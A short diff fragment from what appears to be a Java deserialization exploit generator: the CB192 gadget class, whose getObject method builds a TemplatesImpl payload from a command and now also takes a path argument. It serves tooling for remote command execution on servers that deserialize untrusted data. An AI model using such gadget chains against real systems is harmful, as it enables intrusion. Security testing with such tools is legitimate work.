@@ -13,8 +13,8 @@ import java.util.PriorityQueue;
 public class CB192 implements Gadget {
 
     @Override
-    public Object getObject(String command) throws Exception {
-        TemplatesImpl template = TemplateUtils.getTemplate(command);
+    public Object getObject(String command,String path) throws Exception {
+        TemplatesImpl template = TemplateUtils.getTemplate(command,path);
 
         // 创建序列化对象
         Class c = Class.forName("java.lang.String$CaseInsensitiveComparator");
